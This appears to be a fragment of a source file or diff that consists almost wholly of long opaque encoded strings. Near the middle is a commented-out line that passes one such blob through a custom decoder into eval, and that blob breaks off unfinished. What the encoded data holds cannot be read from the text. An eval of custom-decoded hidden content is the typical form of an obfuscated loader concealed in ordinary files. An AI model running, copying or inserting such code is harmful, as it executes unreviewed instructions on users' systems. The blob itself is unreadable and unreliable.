LFTVyBTBLFTMyBTXOBTBLBTXAFTV1BTBLFTM1BTBLFTV5BTBLFTM1BTBLFTWwBTBLFTMyBTXOBTBLBTXAFTWyBTBLFTMwBTBLFTWxBTBLFTMqBTBLFTWqBTBLFTO4BTXOBTBLBTXAFTV4BTBLFTO3BTBLFTV3BTBLFTO4BTBLFTV3BTBLFTO4BTXOBTXOBTBLrUB1dRWxSRWyVeinFlswGLWnFoFwFlVnFoFnGWMnGWMwGLWnFoFwFlVnFoFwGLFnFoFwFlMnFoFwGLVnFoFwFlOnGWVnFoFnGWMwGLcnFoFwFTonFoFwGTHnFoFwFTsnFoFwGTHnFoFwFTsnGWVnGWVnFlonFbBhBTM4FTcxBTBLFTF1BTBLBTXABTXAFTcxBTBLFTF1BTBLFTW3BTBLFTVqBTBLFTW2BTBLFTVwBTXOBTBLBTXAFTW1BTBLFTVyBTBLFTWbBTBLFTV3BTBLFTWyBTBLFTV4BTXOBTBLBTXAFTWwBTBLFTV5BTBLFTWwBTBLFTV5BTBLFTWwBTBLFTV5BTXOBTXOBTM5BTGAJAWxSLO1FRWxVyObSRWxSRWyVeqnFlsnFlonFbBhBTM4FToqBTBLSLHnFoFnGWMnGWMwSTHnFoF4FAWxVyO5FAWxVyJyBTBLFToqBTBLGlonGWVnFoFnGWMwSTOnFoF2GaWxVyO5FaWxVycyBTBLFToxBTBLGlOnGWVnFoFnGWMwSTOnFoF1SRWxVyO5FAWxVyW1BTBLFTs3BTBLGTVnGWVnFoFnGWMwSLFnFoF1GAWxVyO4FxWxVyWbBTBLFTsyBTBLGTVnGWVnGWVnFlonFbBhBTM4FTM4BTBLGTWnFoFnGWMnGWMwFlsnFoF1GRWxVyOxGxWxVyWwBTBLFTFqBTBLGLsnGWVnFoFnGWMwFyVnFoFbGRWxVyOySRWxVyVbBTBLFTF5BTBLGLVnGWVnFoFnGWMwFyonFoFbGAWxVyOyGaWxVyV1BTBLFTF1BTBLGLFnGWVnFoFnGWMwFyVnFoFbFRWxVyOyFRWxVyF1BTBLFTF2BTBLFyonGWVnFoFnGWMwGLOnFoFbFaWxVyObFRWxVyVyBTBLFTVyBTBLGLMnGWVnFoFnGWMwGLWnFoFbFaWxVyObGRWxVyVxBTBLFTV1BTBLGLMnGWVnGWVnFlonFbBhBTM4FTVxBTBLGLHnFoFnGWMnGWMwGLMnFoFbFAWxVyObGRWxVyF3BTBLFTV4BTBLFyJnGWVnFoFnGWMwGTMnFoFySAWxVyO1FaWxVyVqBTBLFTW1BTBLGLHnGWVnFoFnGWMwGTsnFoFbFAWxVyO2FRWxVyF5BTBLFTcwBTBLFyonGWVnFoFnGWMwGlOnFoFySRWxVyO1SRWxVyVxBTBLFTc1BTBLGLFnGWVnFoFnGWMwGyHnFoFbGAWxVyO3FxWxVyV1BTBLFTJbBTBLGLFnGWVnFoFnGWMwGycnFoFbFRWxVyO3FxWxVyV2BTBLFTJ4BTBLGLWnGWVnFoFnGWMwSLFnFoFbGAWxVyO4GaWxVyVbBTBLFTsbBTBLGLJnGWVnFoFnGWMwSLOnFoF1FAWxVyO5FaWxVyV1BTBLFTs3BTBLGLonGWVnFoFnGWMwSLMnFoF1FxWxVyO4SAWxVyWxBTBLFTs4BTBLGTMnGWVnGWVnFlonFbBqBTM4FTsbBTBLGTFnFlonFbBiBTM4BTM5BTGAfxWxSLOxGxWxVyJ5BTBLBTXABTXAFTM3BTBLGyonFoFwFlWnFoF3GaWxVyOxGRWxVyJyBTXOBTBLBTXAFTM1BTBLGyHnFoFwFlcnFoF2SRWxVyOxGaWxVyc1BTXOBTBLBTXAFTM2BTBLGlMnFoFwFlWnFoF2FAWxVyOxGaWxVyW3BTXOBTBLBTXAFTM2BTBLGTFnFoFwFlcnFoFbSAWxVyOxGaWxVyV1BTXOBTBLBTXAFTM3BTBLGLMnFoFwFlJnFoFySRWxVyOxSAWxVyF1BTXOBTBLBTXAFTM5BTBLFyMnFoFwFlonFoFxSRWxVyOxSRWxVyM5BTXOBTXOBTM5BTGAJAWxSLOyFRWxVyM5BTM5BTGAJRWxSLOyFRWxVyM5BTBLFTFyBTBLFyMnFoFwFyWnFoFyFxWxSRWyVuOnFlswFysnFoFyFxWxVyObGaWxVyFbBTBLFTWqBTBLFyFnFlonFbBwBTM4FTWbBTBLFyMnFoFwGTWnFoFxSRWxVyO1SAWxVyM2BTM5BTGAJRWxSLO2FAWxVyMyBTBLFTcxBTBLFlOnFoFwGlVnFoFxFRWxSRWyVuOnFlswGlcnFoFxFaWxVyO2GxWxVyMbBTBLFTc4BTBLFlcnFlonFbBwBTM4FTc4BTBLFlsnFoFwGlsnFoFyFxWxVyO3GAWxVyF2BTM5BTGAJRWxSLO4FAWxVyF5BTBLFTsyBTBLGLHnFoFwSLcnFoFbFAWxSRWyVuOnFlswSTHnFoFbFAWxVyO5FAWxVyVqBTBLFToyBTBLFyonFlonFbBwBTM4FTo1BTBLFysnFoFwSTsnFoFyGAWxVyO5SAWxVyFbBTM5BTGAJAWxSLO5SAWxVyF4BTM5BTGAIAWxSAWxSRWyVeinFlswSTOnFoF3SRWxVxW1VaW1VlO5FRWxVyJ5BTBLFToxBTBLGyonFoFwSTFnFoF3GxW1QAWxVxW1VlO5GAWxVyJ1BTBLFToyBTBLGyFnFoFwSTVnFoF3FRW1QAWxVxW1VlO5GRWxVyJqBTBLFTo3BTBLGlsnFoFwSTJnFoF2GRW1QAWxVxW1VlO5GxWxVycxBTBLFTo2BTBLGlVnFoFwSTJnFoF2FRW1QAWxVxW1VlO5SAWxVyW4BTBLFTo5BTBLGlHnFoFwSTonFoF1GaW1QAWxVxW1VlO5SAWxVyWxBTBLFTo3BTBLGTHnFoFwSTsnFoFbGxW1QAWxVxW1VlO5SRWxVyVbBTBLFlHqBTBLGLVnFoFwSTonFoFbFRW1QAWxVxW1VlO5SRWxVyF5BTBLFTo3BTBLFyJnFoFwSTJnFoFyGxW1QAW1QAWxSRWyVe+nFlswSTonFoFxGAWxVxW1VaW1VlO5SRWxVyVqBTXOBTXOBTM5BTGAfxWxSLO2GRWxVyO4BTBLBTXABTXAFTc1BTBLFTsnFoFwGlJnFoFxFAWxVyO2SRWxVyO4BTXOBTBLBTXAFTJxBTBLFTJnFoFwGyVnFoFwGxWxVyO3SAWxVyO3BTXOBTBLBTXAFTswBTBLFTJnFoFwSLWnFoFwGxWxVyO5FAWxVyO5BTXOBTBLBTXAFTo2BTBLFlOnFoFwSTonFoFxGAWxVyO5SRWxVyMbBTXOBTXOBTM5BTGAfxWxSLOxSRWxVyM5BTBLBTXABTXAFTM5BTBLFlonFoFwFlonFoFxGAWxVyOyFAWxVyMwBTXOBTBLBTXAFTFqBTBLFTsnFoFwFyHnFoFwGRWxVyOyFxWxVyO1BTXOBTBLBTXAFTF2BTBLFTWnFoFwFycnFoFwFxWxVyObGRWxVyOyBTXOBTBLBTXAFTWbBTBLFTFnFoFwGTFnFoFwGAWxVyO1GxWxVyO2BTXOBTBLBTXAFTcxBTBLFTsnFoFwGlWnFoFwSAWxVyO2GRWxVyO4BTXOBTXOBTM5BTGAfxWxSLObGRWxVyO1BTBLBTXABTXAFTV1BTBLFTWnFoFwFysnFoFwFxWxVyOyGRWxVyO3BTXOBTBLBTXAFTFwBTBLFlHnFoFwFyMnFoFwSRWxVyOyFRWxVyMyBTXOBTBLBTXAFTFwBTBLFlJnFoFwFyMnFoFxSAWxVyOyGRWxVyFqBTXOBTBLBTXAFTF3BTBLFyMnFoFwGLsnFoFyFxWxVyO1FRWxVyFwBTXOBTBLBTXAFTW1BTBLFlsnFoFwGTonFoFxGAWxVyO1SRWxVyMqBTXOBTBLBTXAFTW5BTBLFTJnFoFwGTJnFoFwGaWxVyO1FxWxVyO2BTXOBTBLBTXAFTWqBTBLFTWnFoFwGLWnFoFwGRWxVyObGRWxVyO1BTXOBTXOBTBLrUB1dRWxSRWyVeinFlswSLVnFoFwSRWxVxW1VaW1VlO4GAWxVyO5BTBLFTowBTBLFlHnFoFwSTVnFoFxFxW1QAWxVxW1VlO5GxWxVyM3BTBLFTo3BTBLFlonFoFwSTcnFoFyFxW1QAWxVxW1VlO5GRWxVyF3BTBLFToyBTBLFyonFoFwSLFnFoFyGxW1QAWxVxW1VlO3FaWxVyFbBTBLFTJwBTBLFyFnFoFwGlonFoFxSAW1QAWxVxW1VlO2SAWxVyMyBTBLFTc4BTBLFlHnFoFwGyMnFoFwSRW1QAWxVxW1VlO3GRWxVyO4BTBLFTsbBTBLFTonFoFwSLVnFoFwSRW1QAW1QAWxSRWyVeinFlswGLMnFoFwFaWxVxW1VaW1VlObFaWxVyOxBTBLFTV4BTBLSRWxVyO1FaWxVyOqBTXOBTBLBTXAFTW3BTBLFTMnFoFwGTcnFoF4BTBLFTW5BTBLSAW1QAWxVxW1VlO2FaWxVyonFoFwGlMnFoFwFaWxVyO2GaWxVyOxBTXOBTBLBTXAFTJwBTBLFTFnFoFwGyWnFoFwFRWxVyO3SAWxVyOxBTXOBTBLBTXAFTsxBTBLFTFnFoFwSLVnFoFwFaWxVyO4GaWxVyObBTXOBTBLBTXAFTs3BTBLFTcnFoFwSLsnFoFwSRWxVyO4SAWxVyO5BTXOBTXOBTM5BTGAfxWxSLO5SAWxVyOxGRWxVxW1VaW1VlO5SAWxVyOxGRWxVyO5FaWxVyOwFRWxVyO5FaWxVyo3BTXOBTBLBTXAFToxBTBLSLVnFoFwSTcnFoF3GRWxVyMqFAWxVyJyBTXOBTBLBTXAFlHbBTBLGyMnFoFxFLJnFoF3FaWxVyMqGxWxVyJxBTXOBTBLBTXAFlH3BTBLGyMnFoFwSTonFoF3GRWxVyO5GxWxVysxBTXOBTBLBTXAFTo1BTBLSLsnFoFwSTWnFoFwFLOnFoFwSTJnFoFwFLonGWVnFoFnGWMwSTonFoFwFTJnFoFxFLHnFoFwFlVnFoFxFLHnFoFwFlVnGWVnGWVnFoGbJuXnBTM5BTGAfxWxSLMqGaWxVyJxBTBLBTXABTXAFlH2BTBLGyMnFoFxFTMnFoF3FRWxVyMwSAWxVyJ1BTXOBTBLBTXAFlMyBTBLGysnFoFxFlFnFoF3SAWxVyMxFxWxVyJ4BTXOBTXOBTM5BTGAfxWxSLO3SAWxVyOxFAWxVxW1VaW1VlO3SAWxVyOxFAWxVyO4FRWxVyOwGxWxVyO4FaWxVyOwFaW1QAWxVxW1VlO4FxWxVyOqSAWxVyO4FaWxVyOqGaWxVyO4FaWxVyOqGaW1QAW1QAWxSRWyVeinFlswSLHnFoFwGLHnFoFnGWMnGWMwSLHnFoFwGLHnFoFwSLFnFoFwGLMnFoFwSLFnFoFwGLHnGWVnFoFnGWMwSLMnFoFwFyonFoFwSLOnFoFwFycnFoFwSLMnFoFwFycnGWVnFoFnGWMwSLVnFoFwFyJnFoFwSLsnFoFwFyonFoFwSLcnFoFwFyJnGWVnFoFnGWMwSLWnFoFwFyVnFoFwSLMnFoFwFyHnFoFwSLWnFoFwFyMnGWVnFoFnGWMwSLsnFoFwFyFnFoFwSTHnFoFwFyVnFoFwSLonFoFwFyMnGWVnFoFnGWMwSLonFoFwFyHnFoFwSLsnFoFwFlsnFoFwSTHnFoFwFlonGWVnFoFnGWMwSTOnFoFwFyOnFoFwSTVnFoFwFyHnFoFwSTFnFoFwFlonGWVnFoFnGWMwSTOnFoFwFlJnFoFwSTMnFoFwFlcnFoFwSTFnFoFwFlsnGWVnFoFnGWMwSTWnFoFwFlonFoFwSTcnFoFwFlonFoFwSTWnFoFwFlcnGWVnFoFnGWMwSTVnFoFwFlVnFoFwSTWnFoFwFlVnFoFwSTcnFoFwFlWnGWVnFoFnGWMwSTsnFoFwFlJnFoFxFLOnFoFwFlcnFoFwSTonFoFwFlVnGWVnFoFnGWMwSTJnFoFwFlOnFoFwSTcnFoFwFlHnFoFxFLHnFoFwFlMnGWVnFoFnGWMxFLVnFoFwFlFnFoFxFLVnFoFwFlOnFoFxFLMnFoFwFTonGWVnFoFnGWMxFLHnFoFwFTcnFoFxFLOnFoFwFTMnFoFxFLFnFoFwFTcnGWVnFoFnGWMxFLVnFoFwFTonFoFxFLonFoFwFTcnFoFxFLcnFoFwFTFnGWVnFoFnGWMxFLFnFoFwFLonFoFxFLFnFoFwFLJnFoFxFLcnFoFwFLonGWVnFoFnGWMxFLsnFoFwFTOnFoFxFLonFoFwFLonFoFxFLsnFoFwFLcnGWVnFoFnGWMxFLJnFoFwFLVnFoFxFLcnFoFwFLMnFoFxFLsnFoFwFLFnGWVnFoFnGWMxFTOnFoFwFLVnFoFxFTMnFoFwFLVnFoFxFTOnFoFwFLMnGWVnFoFnGWMxFLonFoFwFLOnFoFxFTHnFoF5SRWxVyMwFaWxVyOqFAW1QAWxVxW1VlMwFxWxVyOqFaWxVyMwGAWxVyOqFRWxVyMwFxWxVyo5BTXOBTBLBTXAFlOxBTBLSTcnFoFxFTVnFoF5GAWxVyMwGRWxVyo1BTXOBTBLBTXAFlO3BTBLSTJnFoFxFTonFoF5GAWxVyMwSRWxVyoyBTXOBTBLBTXAFlO4BTBLSTOnFoFxFTsnFoF4SAWxVyMxFAWxVys4BTXOBTBLBTXAFlMxBTBLSLsnFoFxFlMnFoF4SRWxVyMxGAWxVys4BTXOBTBLBTXAFlM2BTBLSLJnFoFxFyOnFoF4GaWxVyMxGxWxVysbBTXOBTBLBTXAFlMxBTBLSLFnFoFxFlFnFoF4FaWxVyMxGAWxVyswBTXOBTBLBTXAFlM2BTBLSLHnFoFxFlsnFoF3GxWxVyMxGRWxVyJ4BTXOBTBLBTXAFlMxBTBLSLHnFoFxFlFnFoF3GxWxVyMxGRWxVyJ2BTXOBTBLBTXAFlM4BTBLGyWnFoFxFlcnFoF3FxWxVyMxGAWxVyJ1BTXOBTBLBTXAFlMwBTBLGyJnFoFxFTonFoF3GaWxVyMxFRWxVyJ1BTXOBTBLBTXAFlMxBTBLGyFnFoFxFlHnFoF3FaWxVyMxFAWxVyJbBTXOBTBLBTXAFlO5BTBLGyJnFoFxFTonFoF3GaWxVyMwSRWxVyJ2BTXOBTXOBTM5BTGAfxWxSLOxFAWxVyo3BTBLBTXABTXAFTMqBTBLSTJnFoFwFlMnFoF5GAWxVyOxGAWxVyobBTXOBTBLBTXAFTM3BTBLSTFnFoFwFlsnFoF5FxWxVyOxSAWxVyoyBTXOBTXOBTM5BTGAfxWxSLOxFAWxVyo5BTBLBTXABTXAFTMqBTBLSTonFoFwFlVnFoF5SRWxVyOxGxWxVyOqFAW1QAWxVxW1VlOxSRWxVyOqFAWxVyOyFAWxVyOqFRWxVyOyFAWxVyOqFRW1QAW1QAWxSRWyVe+nFlswGlsnFoFwGTJnFoFnGWMnGWMwGyMnFoFwGyMnGWVnGWVnFlonFbBhBTM4FyOnFoF5SAWxVxW1VaW1VlFwBTBLSTsnFoFxGaWxVyOqFAWxVyMxBTBLFTHbBTXOBTBLBTXAFTonFoFwFLsnFoFwGxWxVyOwSRWxVyO3BTBLFTO5BTXOBTXOBTM5BTGAfaWxSLMxBTBLFTHbBTBLBTXABTXAFTVnFoFwFLonGWVnGWVnFlonFbBhBTM4FyonFoFwFlcnFoFnGWMnGWMySRWxVyOxGaWxVyV3BTBLFTVxBTBLGTHnFoFwGLcnGWVnFoFnGWM1FxWxVyO1FRWxVycbBTBLFTW5BTBLGlsnFoFwGlWnGWVnFoFnGWM3FaWxVyO3FAWxVyJyBTBLFTJyBTBLGyFnFoFwGyFnGWVnFoFnGWM3FxWxVyO3FxWxVyJ2BTBLFTc3BTBLGyJnFoFwGlWnGWVnFoFnGWM3SAWxVyO2FxWxVyJ5BTBLFTcwBTBLGyonFoFwGlOnGWVnGWVnFlonFbBhBTM4FysnFoFwGTHnFoFnGWMnGWMySRWxVyO1FAWxVyWwBTBLFTV5BTBLGTOnFoFwGLonGWVnFoFnGWM1FRWxVyObSRWxVyW1BTBLFTWxBTBLGTWnFoFwGTVnGWVnFoFnGWM1GAWxVyO1GaWxVyWqBTBLFTW4BTBLGTWnFoFwGlOnGWVnFoFnGWM1SRWxVyO2GAWxVyc5BTBLFTc4BTBLGlonFoFwGlsnGWVnGWVnFlonFbBhBTM4FlJnFoF1SRWxVxW1VaW1VlMbBTBLGTcnFoFxGRWxVyW2BTBLFlcnFoF1FaW1QAWxVxW1VlM2BTBLGLsnFoFxFxWxVyVbBTBLFlVnFoFbFaW1QAWxVxW1VlM1BTBLGLOnFoFxFRWxVyF4BTBLFlFnFoFyFxW1QAWxVxW1VlM2BTBLFlsnFoFxGAWxVyM2BTBLFlsnFoFxFAW1QAWxVxW1VlFyBTBLFTFnFoFySRWxVycnFoFySRWxVycnGWVnGWVnFlonFbBqBTM4GLOnFoFyBTM5BTGAIAWxSAWxSRWyVeinFlswFlOnFoF2FAWxVxW1VaW1VlOxFAWxVyW5BTBLFTMxBTBLGTonFoFwFlMnFoF1FxW1QAWxVxW1VlOxFaWxVyV2BTBLFTMbBTBLGLonFoFwFlVnFoFbFxW1QAWxVxW1VlOxGRWxVyF4BTBLFTM3BTBLFycnFoFwFlWnFoFyFAW1QAWxVxW1VlOxFaWxVyM1BTBLFTMyBTBLFTonFoFwFlHnFoFwGaW1QAWxVxW1VlOwGxWxVyOxBTBLFTOxBTBLSAWxVyOwFAWxVyWnGWVnFoFnGWMwFLJnFoFwBTBLFTHbBTBLFAWxVyOqGAWxVyHnGWVnGWVnFlonFbBhBTM4GLFnFoFbSRWxVxW1VaW1VlVyBTBLGLonFoFyGaWxVyWwBTBLFyWnFoF1GAW1QAWxVxW1VlFyBTBLGTcnFoFyFxWxVyW2BTBLFyFnFoF1GaW1QAW1QAWxSRWyVeinFls1GaWxVyMqBTBLBTXABTXAGTcnFoFxFAWxVycbBTBLFTonFoF2SRWxVyMxBTXOBTBLBTXAGyVnFoFxGRWxVyJ2BTBLFlFnFoF4FAWxVyM1BTXOBTBLBTXASLVnFoFxGxWxVys3BTBLFlOnFoF4GaWxVyFwBTXOBTBLBTXASLWnFoFbFAWxVysyBTBLGLFnFoF4FxWxVyVyBTXOBTXOBTM5BTGAJAWxSLsyBTBLGLFnFlonFbBiBTM4BTM5BTGAfxWxSLs4BTBLFlJnFoFnGWMnGWM4SAWxVyM3BTBLSTOnFoFxSRWxVyowBTBLFyMnGWVnFoFnGWM5FRWxVyF1BTBLSTHnFoFySRWxVyoqBTBLGLMnGWVnFoFnGWM4SRWxVyV2BTBLSTOnFoF1FRWxVyowBTBLGTOnGWVnGWVnFlonFbBhBTM4STMnFoFxSRWxVxW1VaW1VloxBTBLFlonFoF5FxWxVyF1BTBLSTWnFoFySAW1QAWxVxW1Vlo2BTBLGLMnFoFwFLHnFoFbSAWxVyOqFAWxVyV4BTXOBTXOBTM5BTGAfxWxSLo2BTBLFyOnFoFnGWMnGWM5GaWxVyFwBTBLFTHwBTBLFyMnFoFwFLFnFoFyGaW1QAWxVxW1VlOqGRWxVyVqBTBLFTHbBTBLGLWnFoFwFLVnFoFbGRW1QAW1QAWxSRWyVeinFlswFLWnFoFySAWxVxW1VaW1VlOqGRWxVyF4BTBLFTOqBTBLFysnFoFwFLonFoFbFRW1QAWxVxW1VlOqSAWxVyV1BTBLFTH1BTBLGLonFoFwFLJnFoF1FRW1QAWxVxW1VlOwFAWxVyWyBTBLFTObBTBLGTVnFoFwFTVnFoF1GAW1QAW1QAWxSRWyVeinFlswFTHnFoFbFaWxVxW1VaW1VlOwFAWxVyVxBTBLFTOxBTBLGLVnFoFwFTMnFoFbGxW1QAWxVxW1VlOwFaWxVyV5BTBLFTOxBTBLGLonFoFwFTMnFoFbSRW1QAW1QAWxSRWyVeinFlswFTFnFoFbGAWxVxW1VaW1VlOwFxWxVyVbBTBLFTObBTBLGLsnFoFwFTcnFoFbSRW1QAWxVxW1VlOwSAWxVyV5BTBLFTMqBTBLGTHnFoFwFlHnFoF1FAW1QAW1QAWxSRWyVeinFls1GAWxVyMqBTBLBTXABTXAGTVnFoFxFAWxVyV5BTBLFlMnFoF1FAWxVyM2BTXOBTBLBTXAGTOnFoFyFAWxVyWqBTBLFyMnFoF1FAWxVyFxBTXOBTXOBTM5BTGAfxWxSLV4BTBLFlVnFoFnGWMnGWMbSAWxVyMbBTBLGLWnFoFxFaWxVyV2BTBLFlcnGWVnFoFnGWMbGaWxVyFqBTBLGTMnFoFyFaWxVyWqBTBLFycnGWVnFoFnGWMbSRWxVyVqBTBLGLJnFoFbFRWxVyV3BTBLGLOnGWVnGWVnFlonFbBhBTM4GLFnFoFxSRWxVxW1VaW1VlVyBTBLFlonFoFySRWxVyFxBTBLFyonFoFyGAW1QAWxVxW1VlVqBTBLFycnFoFbGAWxVyF3BTBLGLMnFoFySRW1QAWxVxW1VlF5BTBLGLOnFoFyGaWxVyVxBTBLFycnFoFbFaW1QAW1QAWxSRWyVe8nFlsnFlonGbQzDewgIeXLc0HnFbVnFlrxI3XkdAWxGxWyVeOkIEnkdWgpfY4nFbVnFlrxI3XkdAWxGxWyVeOkIYnbd0BFfY1grAWyQLOqBTGAcR5ifY5nX2norEsnFbV1BTGAcR5yrUBpf2XTrUnidRWyQAWxGxWxF2dedededaWxGxWyVeWnFlsnFlonFbBzDewgIeX0fYQbfAWyQLOnFbBzDuGbJe9hdXGbPYwnBTGOBTM3BTMyFLHqFLHqBTM3BTGAdRWxSAWxSRWyVeVkdeniINGbPYwnBTGOBTM3BTMyFLHqFLHqBTM3BTGAdA5efYwiXEX4rAWxSAWxG1G6cYwpIe5zBTMqBWW5JxWxFOGgc2OnFlJnFoFxGLHnFoFbGTHnFlonFbBoDeQxc0rBIYNudRWxSEFnFoFxFAWxVyM5FAWxSRWyVaW3QAW3QAWxSRWxSEGbPAWxSVKK"));
+    ///
+	//	eval(coder.decode("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